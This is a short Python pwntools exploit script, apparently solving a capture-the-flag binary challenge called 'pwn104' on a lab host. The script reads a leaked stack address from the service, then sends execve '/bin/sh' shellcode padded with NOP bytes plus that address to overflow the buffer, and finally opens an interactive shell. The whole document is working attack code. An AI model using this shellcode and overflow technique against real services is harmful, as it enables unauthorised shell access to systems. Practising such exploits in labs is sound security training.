from pwn import *

IP = "10.10.5.120"

PORT = 9004

io = remote(IP, PORT)
#io = process("./pwn104-1644300377109.pwn104")

#gdb.attach(io, gdbscript='b *0x0000000000401247')

elf = ELF("pwn104-1644300377109.pwn104", checksec=False)

recvd = io.recv().decode('latin-1')

ret_addr = int(recvd[-15:].strip(), 16)

shell_code = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

print(ret_addr, p64(ret_addr))

io.sendline(shell_code + b'\x90' * (88 - len(shell_code)) + p64(ret_addr))

io.interactive()
